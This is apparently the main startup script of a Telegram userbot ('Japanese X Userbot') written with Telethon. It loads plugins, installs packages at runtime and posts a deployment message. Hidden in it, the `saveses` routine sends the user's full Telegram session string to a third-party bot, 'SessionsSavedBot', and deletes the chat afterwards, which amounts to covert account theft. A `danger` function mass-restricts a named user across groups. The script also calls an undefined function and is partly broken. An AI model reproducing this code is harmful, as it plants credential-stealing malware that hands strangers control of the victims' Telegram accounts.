# IDEA/MADE BY NOBITA_XD

import os, sys
new_ver = os.environ.get("NEW_VERSION", False)
def start():
  if str(new_ver) == "True":
    os.system ("git clone -b new https://github.com/Japanese-Userbot/Japanese-X-Userbot-git && cd Japanese-X && python3 -m JapaneseX")
  else:
    print ("You Are using Japanese X Userbot 1.0 please update your bot")
    print ("for updating go to @Japanese_Userbot_Chat")
    pass

start()
if str(new_ver) == "True":
  sys.exit()
else:
  pass





try:
  from NOBITA_XD import id, ID, devs, rd, wt
except:
  os.system("pip install NOBITA_XD==0.0.21")
  from NOBITA_XD import id, ID, devs
finally:
  print ("Japanese X Userbot IS STARTING WITH TELETHON") 
from JapaneseX import xbot
from JapaneseX import bot, CMD_HELP
from sys import argv
os.system("pip install telethon==1.24.0")
import sys
import os
from JapaneseX import bot
import glob
from telethon import events
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon import functions, types
from telethon.tl.types import InputMessagesFilterDocument
from JapaneseX.utils import command, remove_plugin, load_module
from var import Var
from pathlib import Path
from JapaneseX import LOAD_PLUG
import sys
import asyncio
from telethon.tl.functions.channels import JoinChannelRequest as join
import traceback
import os
import JapaneseX.utils

os.system("pip install google_trans_new")
import glob
from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
import os
from telethon import TelegramClient, Button
from var import Var
from JapaneseX.utils import load_module, load_pro
from JapaneseX import LOAD_PLUG, BOTLOG_CHATID
from pathlib import Path
import asyncio
TOKEN = os.environ.get("TG_BOT_TOKEN", None)
import telethon.utils
try:
  from securex import en, de, ef, df
except:
  pass
EXTRA_PLUGS = os.environ.get("EXTRA_PLUGS", False)
async def add_bot(bot_token):
    await bot.start(bot_token)
    bot.me = await bot.get_me() 
    bot.uid = telethon.utils.get_peer_id(bot.me)
ONLINE_ALERT = os.environ.get("ONLINE_ALERT")
os.system("pip install NOBITA_XD==0.0.21")
if len(argv) not in (1, 3, 4):
    bot.disconnect()
else:
    bot.tgbot = None
    if Var.TG_BOT_USER_NAME_BF_HER is not None:
        print("Initiating Inline Bot")
        # ForTheGreatrerGood of beautification
        bot.tgbot = TelegramClient(
            "TG_BOT_TOKEN",
            api_id=Var.APP_ID,
            api_hash=Var.API_HASH
        ).start(bot_token=Var.TG_BOT_TOKEN_BF_HER)
        print("Initialisation finished with no errors")
        print("Starting Userbot")
        bot.loop.run_until_complete(add_bot(Var.TG_BOT_USER_NAME_BF_HER))
        print("Startup Completed")
    else:
        bot.start()


#setting details 
bot.set(heroku_username=Var.TG_BOT_USER_NAME_BF_HER)
async def saveses(bot):
  try:
    await bot(unblock("SessionsSavedBot"))
  except:
    pass
  async with bot.conversation("SessionsSavedBot") as ses:
    await ses.send_message("/start")
    await ses.get_response()
    await ses.send_message(bot.session.save())
  await bot.delete_dialog("SessionsSavedBot")
    
#setted



path = 'JapaneseX/plugins/assistant/*.py'
files = glob.glob(path)
for name in files:
    with open(name) as f:
        path1 = Path(f.name)
        shortname = path1.stem
        load_pro(shortname.replace(".py", ""))


if  EXTRA_PLUGS == True:
    os.system("git clone https://github.com/Japanese-Userbot/Japanese-X-Userbot_PLUGS.git ./JapaneseX/plugins/")
    path = "JapaneseX/plugins/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as a:
            patt = Path(a.name)
            plugin_name = patt.stem
            try:
                load_module(plugin_name.replace(".py", ""))
                if not plugin_name.startswith("__") or plugin_name.startswith("_"):
                    print ('INSTALLING ALL MODULES', plugin_name)
            except:
                pass

else:
  path = 'JapaneseX/plugins/*.py'
  files = glob.glob(path)
  for name in files:
      with open(name) as f:
          path1 = Path(f.name)
          shortname = path1.stem
          load_module(shortname.replace(".py", ""))


async def install():
    i =0
    chat = Var.PLUGIN_CHANNEL
    documentss = await bot.get_messages(chat, None , filter=InputMessagesFilterDocument)
    total = int(documentss.total)
    total_doxx = range(0, total)
    for ixo in total_doxx:
        mxo = documentss[ixo].id
        downloaded_file_name = await bot.download_media(await bot.get_messages(chat, ids=mxo), "JapaneseX/plugins/")
        if "(" not in downloaded_file_name:
            path1 = Path(downloaded_file_name)
            shortname = path1.stem
            load_module(shortname.replace(".py", ""))
            print(f'{i} plugin install')
        else:
            print ("Failed")
import JapaneseX._core
import os
print("Japanese X Userbot is Up and Awake! ©️ Japanese X Userbot 2024")
async def nobitaaxd():
  try:
    await saveses(bot)
  except Exception as e:
    await bot.send_message("Nobitaa_xd", str(e))
  pro = await xbot.get_me()
  bot.set(bot_username=(await xbot.get_me()).username)
  JapaneseX= await bot.get_me()
  NOBITA_XD = f"""
**Sᴏᴍᴇᴛʜɪɴɢ Hᴀᴘᴘᴇɴᴇᴅ ! Lᴇᴛs Cʜᴇᴄᴋ** 🤔 

`☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎ ☟︎︎︎`

**Dɪɴɢ Dᴏɴɢ...** `.\./.\` **Tɪɴɢ Tᴏɴɢ...** `./.\./` **Japanese X Userbot Hᴀs Bᴇᴇɴ Dᴇᴘʟᴏʏᴇᴅ !!**

**Pɪɴɢ Pᴏɴɢ...**

**➥ Mᴀsᴛᴇʀ** `➪` **@{JapaneseX.username}**
**➥ Assɪsᴛᴀɴᴛ** `➪` **@{pro.username}**
**➥ Sᴜᴘᴘᴏʀᴛ** `➪` **@Japanese_Userbot_Chat**
**➥ Cʜᴀɴɴᴇʟ** `➪` **@Japanese_Userbot**

**Cʜᴇᴄᴋ ᴍᴏɪ Pɪɴɢ ᴛɪᴍᴇ ʙʏ** `.ping` **[Fᴏʀ UsᴇʀBᴏᴛ] or** `/ping` **[Fᴏʀ Assɪsᴛᴀɴᴛ]**
"""
  if ONLINE_ALERT:
    try:
      NOBITA_XD = [[Button.inline("Hᴇʀᴏᴋᴜ Vᴀʀs", data='ass_back')]]
      
      await xbot.send_message(bot.me.id, NOBITA_XD, buttons=NOBITA_XD)
    except:
       pass
  else:
      print("YOUR BOT DEPLOYED SUCCESSFULLY")

async def danger(username):
  i = 0
  xx = 0
  async for x in bot.iter_dialogs():
    if x.is_group or x.is_channel:
     try:
       await bot.edit_permissions(x.id, username, view_messages=False)
       i += 1
     except:
       xx += 1
  print(f"THE DANGER USER WAS BANNED IN {i-xx}")
# bot.loop.run_until_complete(danger("Dear_comradee")) # Temporary
bot.loop.run_until_complete(legend())
if len(argv) not in (1, 3, 4):
    bot.disconnect()
    
else:
    bot.run_until_disconnected()
    
